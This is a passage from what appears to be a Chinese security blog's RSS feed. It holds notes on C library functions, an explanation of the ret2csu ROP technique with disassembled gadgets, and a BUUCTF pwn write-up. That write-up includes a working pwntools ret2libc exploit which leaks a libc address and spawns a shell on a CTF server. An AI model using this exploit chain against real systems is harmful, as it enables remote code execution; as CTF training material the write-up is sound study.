&lt;h1 id=&#34;4freadbuffersizecountstream&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4freadbuffersizecountstream&#34;&gt;#&lt;/a&gt; 4.fread(buffer,size,count,stream)&lt;/h1&gt;
&lt;p&gt;功能：从给定输入流 stream 读取最多 count 个对象到数组 buffer 中（相当于以对每个对象调用 size 次 fgetc），把 buffer 当作 unsigned char 数组并顺序保存结果。流的文件位置指示器前进读取的字节数。&lt;/p&gt;
&lt;p&gt;返回值：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;返回成功读取的对象个数，若出现错误或到达文件末尾，则可能小于count。

若size或count为零，则fread返回零且不进行其他动作。

fread不区分文件尾和错误，因此调用者必须用feof和ferror才能判断发生了什么。
示例
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;buffer : 指向要读取的数组中首个对象的指针&lt;/li&gt;
&lt;li&gt;size : 每个对象的大小（单位是字节）&lt;/li&gt;
&lt;li&gt;count : 要读取的对象个数&lt;/li&gt;
&lt;li&gt;stream ：输入流&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;5-int-sprintfchar-string-char-format-argument&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-int-sprintfchar-string-char-format-argument&#34;&gt;#&lt;/a&gt; 5. int sprintf(char *string, char *format [,argument,...]);&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;将结果打印到字符串中，而printf是直接在命令行上输出&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;string-- 这是指向一个字符数组的指针，该数组存储了 C 字符串。&lt;/li&gt;
&lt;li&gt;format--format-- 这是字符串，包含了要 &lt;code&gt;被写入到 string 的文本&lt;/code&gt; 。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。&lt;/li&gt;
&lt;li&gt;[argument]...：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;返回值：&lt;/p&gt;
&lt;p&gt;如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。&lt;/p&gt;
&lt;p&gt;sprintf 返回以 format 为格式 argument 为内容组成的结果被写入 string 的字节数，结束字符‘\0’不计入内。即，如果 “Hello” 被写入空间足够大的 string 后，函数 sprintf 返回 5。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;转换字符
%% 印出百分比符号，不转换。
%c 字符输出到缓冲区，不转换。
%d 整数转成十进位。
%f 倍精确度数字转成浮点数。
%o 整数转成八进位。
%s 字符串输出到缓冲区，不转换。
%x 整数转成小写十六进位。
%X 整数转成大写十六进位。
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;6memchrconst-void-buf-int-ch-size_t-count&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6memchrconst-void-buf-int-ch-size_t-count&#34;&gt;#&lt;/a&gt; 6.memchr(const void *buf, int ch, size_t count)&lt;/h1&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;span&gt;c&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;extern&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;memchr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;buf    &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ch    &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; count&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;功能：从 buf 所指内存区域的前 count 个字节查找字符 ch。&lt;/p&gt;
&lt;p&gt;说明：当第一次遇到字符 ch 时停止查找。如果成功，返回指向字符 ch 的指针；否则返回 NULL。&lt;/p&gt;
&lt;h1 id=&#34;7memcpyvoid-destin-void-source-unsigned-n&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7memcpyvoid-destin-void-source-unsigned-n&#34;&gt;#&lt;/a&gt; 7.memcpy(void *destin, void *source, unsigned n)&lt;/h1&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;span&gt;c&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;memcpy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;destin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;   &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;source&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;    &lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;；&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;功能：从源 source 所指的内存地址的起始位置开始拷贝 n 个字节到目标 destin 所指的内存地址的起始位置中&lt;/p&gt;
&lt;p&gt;返回值：该函数返回一个指向目标存储区 destin 的指针。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;destin-- 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。&lt;/li&gt;
&lt;li&gt;source-- 指向要复制的数据源，类型强制转换为 void* 指针。&lt;/li&gt;
&lt;li&gt;n-- 要被复制的字节数。&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/</guid>
            <title>64位构造通用ROP，ret2csu</title>
            <link>https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/</link>
            <category>pwn</category>
            <category>ret2csu</category>
            <pubDate>Thu, 24 Aug 2023 19:23:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ret2csu&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ret2csu&#34;&gt;#&lt;/a&gt; ret2csu&lt;/h1&gt;
&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候我们很难找到每个寄存器对应的 gadges。这时候，我们可以利用 x64 下的__libc_csu_init 中的 gadgets。&lt;/li&gt;
&lt;li&gt;这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令&#34;&gt;#&lt;/a&gt; 下面借用别人在 IDA 摘出来的__libc_csu_init 函数的汇编指令&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;.text:00000000004011B0 ; void _libc_csu_init(void)
.text:00000000004011B0                 public __libc_csu_init
.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004011B0 ; __unwind &amp;#123;
.text:00000000004011B0                 push    r15
.text:00000000004011B2                 mov     r15, rdx
.text:00000000004011B5                 push    r14
.text:00000000004011B7                 mov     r14, rsi
.text:00000000004011BA                 push    r13
.text:00000000004011BC                 mov     r13d, edi
.text:00000000004011BF                 push    r12
.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004011C8                 push    rbp
.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004011D0                 push    rbx
.text:00000000004011D1                 sub     rbp, r12
.text:00000000004011D4                 sub     rsp, 8
.text:00000000004011D8                 call    _init_proc
.text:00000000004011DD                 sar     rbp, 3
.text:00000000004011E1                 jz      short loc_4011FE
.text:00000000004011E3                 xor     ebx, ebx
.text:00000000004011E5                 nop     dword ptr [rax]
.text:00000000004011E8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gadgets2:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j
.text:00000000004011E8                 mov     rdx, r15
.text:00000000004011EB                 mov     rsi, r14
.text:00000000004011EE                 mov     edi, r13d
.text:00000000004011F1                 call    qword ptr [r12+rbx*8]
.text:00000000004011F5                 add     rbx, 1
.text:00000000004011F9                 cmp     rbp, rbx
.text:00000000004011FC                 jnz     short loc_4011E8
.text:00000000004011FE
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gadgets1:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j
.text:00000000004011FE                 add     rsp, 8
.text:0000000000401202                 pop     rbx
.text:0000000000401203                 pop     rbp
.text:0000000000401204                 pop     r12
.text:0000000000401206                 pop     r13
.text:0000000000401208                 pop     r14
.text:000000000040120A                 pop     r15
.text:000000000040120C                 retn
.text:000000000040120C ; &amp;#125; // starts at 4011B0
.text:000000000040120C __libc_csu_init endp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里搬运之前在 CSDN 上发的文章（汇编代码执行顺序为先 gadgets2, 然后 gadgets1）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/8abb18a591a445808abc86226a99d2c9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;pop 命令 会把栈中的值存入相应的寄存器中，那么我们可以通过往栈中写对应的数据来存入寄存器里&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/8400e847c08a419ba7c04f174dc26712.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cmp&lt;/span&gt;     rbx, rbp   //cpm后的不同的调整指令有着不同的作用，这里 jnz 比较结果相同不跳转，不相同就跳转&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;jnz     short loc_400580&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;最后第二次回到 gadget1 时，此时已经给寄存器赋值完毕只需要回到 ret，此处填充 56 个 padding 字符是因为在地址 0x4011FE 处有   &lt;code&gt;add rsp , 8 &lt;/code&gt;  这会把 rsp 栈提高 8，所以要填充 8 个字符来站这个位置，后面的  &lt;code&gt;pop rbx ~ pop r15&lt;/code&gt;  共有 6 个寄存器，pop 了 6 次，所以总共是 （6+1）*8=56，所以填充 56 个字符即可到 ret 来控制程序执行&lt;/p&gt;
&lt;p&gt;例题:&lt;a href=&#34;https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/&#34; title=&#34;ret2csu&#34;&gt;https://vvwwvv.cn/2023/05/04/pwn/ 刷题 / 看雪社区 / 看雪社区 pwn8 (64 位构造通用 ROP,ret2csu)/&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/</guid>
            <title>buuctf.pwn</title>
            <link>https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/</link>
            <category>pwn</category>
            <category>二进制</category>
            <category>ctf</category>
            <pubDate>Thu, 04 May 2023 19:33:55 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;#buuctf&lt;br /&gt;
##[HarekazeCTF2019]baby_rop2&lt;/p&gt;
&lt;p&gt;##pwn2_sctf_2016&lt;br /&gt;
&lt;img data-src=&#34;kerd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;##&amp;lt;center&amp;gt;&lt;strong&gt;31.&lt;strong&gt;jarvisOJ_level3(&lt;strong&gt;ret2libc&lt;/strong&gt;)&amp;lt;/center&amp;gt;&lt;br /&gt;
####1. 下载源文后查看文件保护和位数&lt;br /&gt;
&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/06/pPsjif1.md.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 ####2. 发现是 32 位程序，开启了 NX (栈不可执行)&lt;br /&gt;
####，利用 ida 反编译查看程序 C 语言代码&lt;br /&gt;
&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/06/pPsjPYR.md.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 #### 发现有 vul 函数进入查看&lt;br /&gt;
&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/06/pPsjCk9.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 ####3. 发现有 write 和 read 函数，其中 read 函数可以进行栈溢出，可以对此利用 	注意:write (1, 输出地址，输出字节数)&lt;br /&gt;
 因为没有发现后门函数，所以利用&lt;/strong&gt; write 泄露 libc 的地址来执行 system (/bin/sh)&lt;/strong&gt;&lt;br /&gt;
###exp:&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher3 &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;28074&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./level3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	write_plt&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;plt&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	read_got&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	main&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;symbols&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;main&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Input:\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;write_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;read_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#p.recvuntil(&#34;Input:\n&#34;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	read&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	libc&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;LibcSearcher&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	libcbase&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;read&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	system&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;libcbase&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;system&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	binsh&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;libcbase&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str_bin_sh&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Input:\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	payload2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;system&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binsh&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;#### 此题无法用 libcsearcher 远程库找到 libc&lt;/p&gt;
 ]]></description>
        </item>
        <item>
